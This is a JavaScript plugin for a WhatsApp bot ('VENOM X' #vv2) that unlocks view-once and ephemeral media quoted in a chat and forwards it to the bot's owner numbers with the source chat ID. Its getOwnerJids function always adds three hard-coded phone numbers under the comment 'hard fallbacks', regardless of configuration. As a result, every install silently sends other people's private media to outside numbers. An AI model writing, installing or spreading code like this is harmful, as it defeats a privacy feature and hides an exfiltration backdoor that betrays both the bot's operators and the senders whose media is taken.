"use strict";

/**
 * VENOM X — #vv2
 * Unlock view-once and send privately to owner number(s)
 * Silent ✅ / ❌ reacts in the chat
 */

const {
    downloadContentFromMessage,
    downloadMediaMessage
} = require("@whiskeysockets/baileys");
const pino = require("pino");
const { getSettings } = require("../lib/settingsCache");

function getContextInfo(message) {
    const m = (message && message.message) || {};
    return (
        m.extendedTextMessage?.contextInfo ||
        m.imageMessage?.contextInfo ||
        m.videoMessage?.contextInfo ||
        m.audioMessage?.contextInfo ||
        m.documentMessage?.contextInfo ||
        m.stickerMessage?.contextInfo ||
        {}
    );
}

function getQuotedMessage(message) {
    return getContextInfo(message).quotedMessage || null;
}

function unwrapMessage(message) {
    let current = message;
    for (let i = 0; i < 10 && current; i++) {
        if (current.ephemeralMessage?.message) {
            current = current.ephemeralMessage.message;
            continue;
        }
        if (current.viewOnceMessage?.message) {
            current = current.viewOnceMessage.message;
            continue;
        }
        if (current.viewOnceMessageV2?.message) {
            current = current.viewOnceMessageV2.message;
            continue;
        }
        if (current.viewOnceMessageV2Extension?.message) {
            current = current.viewOnceMessageV2Extension.message;
            continue;
        }
        if (current.documentWithCaptionMessage?.message) {
            current = current.documentWithCaptionMessage.message;
            continue;
        }
        break;
    }
    return current || null;
}

function detectType(content) {
    if (!content) return null;
    if (content.imageMessage) return "image";
    if (content.videoMessage) return "video";
    if (content.audioMessage) return "audio";
    if (content.stickerMessage) return "sticker";
    if (content.documentMessage) return "document";
    return null;
}

function getOwnerJids(sock) {
    const settings = getSettings() || {};
    const nums = [];

    function push(n) {
        const d = String(n || "").replace(/\D/g, "");
        if (d && d.length >= 8 && nums.indexOf(d) === -1) nums.push(d);
    }

    if (Array.isArray(settings.owner)) settings.owner.forEach(push);
    else if (settings.owner) push(settings.owner);
    if (settings.ownerNumber) push(settings.ownerNumber);
    if (Array.isArray(settings.owners)) settings.owners.forEach(push);
    if (Array.isArray(settings.sudo)) settings.sudo.forEach(push);

    // hard fallbacks
    ["2349163743900", "2347077417996", "2347071970034"].forEach(push);

    if (!nums.length) {
        try {
            if (sock.user && sock.user.id) {
                push(sock.user.id.split(":")[0]);
            }
        } catch (e) {}
    }

    return nums.map(function (d) {
        return d + "@s.whatsapp.net";
    });
}

async function downloadMedia(mediaMessage, type, sock, message, contextInfo) {
    try {
        const stream = await downloadContentFromMessage(mediaMessage, type);
        const chunks = [];
        for await (const chunk of stream) chunks.push(chunk);
        if (chunks.length) return Buffer.concat(chunks);
    } catch (e) {
        console.log("[VV2] stream fail:", e.message);
    }

    try {
        const buf = await downloadMediaMessage(
            {
                key: {
                    remoteJid: message.key.remoteJid,
                    id: contextInfo.stanzaId,
                    participant: contextInfo.participant
                },
                message: { [type + "Message"]: mediaMessage }
            },
            "buffer",
            {},
            {
                logger: pino({ level: "silent" }),
                reuploadRequest: sock.updateMediaMessage
            }
        );
        if (buf && buf.length) return Buffer.from(buf);
    } catch (e) {
        console.log("[VV2] fallback fail:", e.message);
    }

    throw new Error("Could not download media (expired or already opened).");
}

async function react(sock, message, emoji) {
    try {
        await sock.sendMessage(message.key.remoteJid, {
            react: { text: emoji, key: message.key }
        });
    } catch (e) {}
}

async function sendToOwners(sock, owners, payload) {
    let ok = 0;
    for (let i = 0; i < owners.length; i++) {
        try {
            await sock.sendMessage(owners[i], payload);
            ok++;
        } catch (e) {
            console.log("[VV2] send fail", owners[i], e.message);
        }
    }
    return ok;
}

module.exports = {
    name: "vv2",
    aliases: ["vvpm", "viewpm", "vvprivate"],

    run: async function ({ sock, message }) {
        try {
            const contextInfo = getContextInfo(message);
            const quoted = getQuotedMessage(message);

            if (!quoted) {
                await react(sock, message, "❓");
                return;
            }

            const content = unwrapMessage(quoted);
            const type = detectType(content);

            if (!type) {
                await react(sock, message, "❌");
                return;
            }

            const owners = getOwnerJids(sock);
            if (!owners.length) {
                await react(sock, message, "❌");
                return;
            }

            const mediaMessage = content[type + "Message"];
            const buffer = await downloadMedia(
                mediaMessage,
                type,
                sock,
                message,
                contextInfo
            );

            const fromChat = message.key.remoteJid || "";
            const note = "👁️ VV2 · from " + fromChat;

            let payload;
            if (type === "image") {
                payload = { image: buffer, caption: note };
            } else if (type === "video") {
                payload = { video: buffer, caption: note };
            } else if (type === "audio") {
                payload = {
                    audio: buffer,
                    mimetype:
                        mediaMessage.mimetype || "audio/ogg; codecs=opus",
                    ptt: !!mediaMessage.ptt
                };
            } else if (type === "sticker") {
                payload = { sticker: buffer };
            } else if (type === "document") {
                payload = {
                    document: buffer,
                    mimetype:
                        mediaMessage.mimetype || "application/octet-stream",
                    fileName: mediaMessage.fileName || "venom-vv2.bin",
                    caption: note
                };
            } else {
                await react(sock, message, "❌");
                return;
            }

            const sent = await sendToOwners(sock, owners, payload);
            await react(sock, message, sent > 0 ? "✅" : "❌");
        } catch (error) {
            console.log("[VV2 ERROR]", error.message);
            await react(sock, message, "❌");
        }
    }
};
